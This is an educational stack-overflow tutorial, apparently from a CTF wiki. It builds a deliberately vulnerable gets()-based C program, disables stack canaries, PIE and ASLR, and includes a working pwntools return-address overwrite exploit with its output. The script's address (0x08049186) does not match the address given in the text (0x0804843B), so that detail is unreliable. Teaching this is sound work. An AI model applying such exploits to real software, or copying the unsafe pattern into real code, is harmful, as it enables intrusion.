# Stack Overflow Principle

## Introduction

Stack overflow refers to a situation where a program writes more bytes to a variable on the stack than the variable itself has allocated, thereby changing the values of adjacent variables on the stack. This is a specific type of buffer overflow vulnerability, similar to heap overflow, bss segment overflow, and other overflow methods. A stack overflow vulnerability can at minimum crash the program, and at worst allow an attacker to control the program's execution flow. Additionally, it is not difficult to see that the basic prerequisites for a stack overflow are:

- The program must write data to the stack.
- The size of the written data is not properly controlled.

## Basic Example

The most typical stack overflow exploitation is overwriting the program's return address with an address controlled by the attacker, **of course, it is necessary to ensure that the segment where this address resides has executable permissions**. Below, we give a simple example:

```C
#include <stdio.h>
#include <string.h>

void success(void)
{
    puts("You Hava already controlled it.");
}

void vulnerable(void)
{
    char s[12];

    gets(s);
    puts(s);

    return;
}

int main(int argc, char **argv)
{
    vulnerable();
    return 0;
}
```

The main purpose of this program is to read a string and output it. **We want to control the program to execute the success function.**

We compile it using the following command:

```shell
➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
stack_example.c: In function 'vulnerable':
stack_example.c:6:3: warning: implicit declaration of function 'gets' [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o: In function 'vulnerable':
stack_example.c:(.text+0x27): warning: the `gets' function is dangerous and should not be used.
```

As we can see, `gets` is inherently a dangerous function. It never checks the length of the input string and instead uses a newline character to determine the end of input, so it can easily cause a stack overflow.

> Historically, the **Morris Worm**, the first worm virus, exploited the dangerous `gets` function to achieve stack overflow.

In the gcc compilation command, `-m32` means generating a 32-bit program; `-fno-stack-protector` means disabling stack overflow protection, i.e., not generating a canary.
Additionally, to more conveniently demonstrate the basic exploitation of stack overflow, we also need to disable PIE (Position Independent Executable) to avoid the load base address being randomized. Different gcc versions have different default configurations for PIE. We can use the command `gcc -v` to check gcc's default settings. If the parameter `--enable-default-pie` is present, it means PIE is enabled by default, and we need to add the `-no-pie` parameter to the compilation command.

After successful compilation, we can use the checksec tool to check the compiled binary:

```
➜  stack-example checksec stack_example
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Regarding PIE protection at compile time, the Linux platform also has the Address Space Layout Randomization (ASLR) mechanism. In short, even if the executable has PIE protection enabled, the system must also have ASLR enabled to truly randomize the base address; otherwise, the program will still load at a fixed base address at runtime (though different from the base address when PIE is disabled). We can control whether ASLR is enabled by modifying `/proc/sys/kernel/randomize_va_space`. The available options are:

- 0: Disable ASLR, no randomization. The base addresses of the stack, heap, and .so will be the same every time.
- 1: Normal ASLR. The stack base address, mmap base address, and .so load base address will be randomized, but the heap base address is not randomized.
- 2: Enhanced ASLR. In addition to option 1, heap base address randomization is added.

We can use `echo 0 > /proc/sys/kernel/randomize_va_space` to disable ASLR on a Linux system, and similarly configure the corresponding parameters.

To reduce the complexity of subsequent exploit development, we disable ASLR here and disable PIE at compile time. Of course, readers can also try different combinations of ASLR and PIE settings, and use IDA with its dynamic debugging capabilities to observe how program addresses change (attacks can also succeed when ASLR is disabled and PIE is enabled).

After confirming that stack overflow and PIE protection are disabled, we use IDA to decompile the binary and examine the vulnerable function. We can see:

```C
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```

The string is 0x14 bytes away from ebp, so the corresponding stack structure is:

```text
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

Furthermore, we can obtain the address of success through IDA, which is 0x0804843B.

```asm
.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp
```

So if the string we read is:

```
0x14*'a'+'bbbb'+success_addr
```

Then, since `gets` reads until a newline character is encountered, we can directly read the entire string, overwrite saved ebp with bbbb, and overwrite retaddr with success_addr. At this point, the stack structure becomes:

```text
                                           +-----------------+
                                           |    0x0804843B   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

However, it should be noted that since values in computer memory are stored byte by byte, they are generally stored in little-endian format, meaning 0x0804843B is stored in memory as:

```text
\x3b\x84\x04\x08
```

But we cannot directly input these characters in the terminal, because when entered in the terminal, \, x, etc. are each treated as individual characters. So we need to find a way to input \x3b as a single character. This is where we need to use pwntools (for installation and basic usage, please refer to GitHub). The pwntools code is as follows:

```python
##coding=utf8
from pwn import *
## Construct the object for interacting with the program
sh = process('./stack_example')
success_addr = 0x08049186
## Construct the payload
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr)
print(p32(success_addr))
## Send the string to the program
sh.sendline(payload)
## Switch from code interaction to manual interaction
sh.interactive()
```

Running the code, we get:

```shell
➜  stack-example python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive
```

We can see that we have indeed executed the success function.

## Brief Summary

The example above actually demonstrates several important steps in stack overflow exploitation.

### Finding Dangerous Functions

By finding dangerous functions, we can quickly determine whether a program may have a stack overflow vulnerability and, if so, where the overflow is located. Common dangerous functions include:

-   Input
    -   gets: reads an entire line directly, ignoring '\x00'
    -   scanf
    -   vscanf
-   Output
    -   sprintf
-   String
    -   strcpy: string copy, stops at '\x00'
    -   strcat: string concatenation, stops at '\x00'
    -   bcopy

### Determining the Padding Length

This part mainly involves calculating **the distance between the address we want to operate on and the address we want to overwrite**. The common method is to open IDA and calculate the offset based on the addresses it provides. Variables generally have the following indexing modes:

- Indexing relative to the stack base pointer: the offset can be obtained directly by examining the offset relative to EBP.
- Indexing relative to the stack pointer: this generally requires debugging, and it will eventually be converted to the first type.
- Direct address indexing: this is equivalent to directly specifying the address.

Generally, we have the following overwrite requirements:

- **Overwriting the function return address**: simply look at EBP.
- **Overwriting the contents of a variable on the stack**: this requires more precise calculation.
- **Overwriting the contents of a variable in the bss segment**.
- Overwriting the contents of specific variables or addresses based on actual execution conditions.

The reason we want to overwrite a certain address is that we want to **directly or indirectly control the program's execution flow** through address overwriting.

## Recommended Reading

[stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)

http://bobao.360.cn/learning/detail/3694.html

https://www.cnblogs.com/rec0rd/p/7646857.html
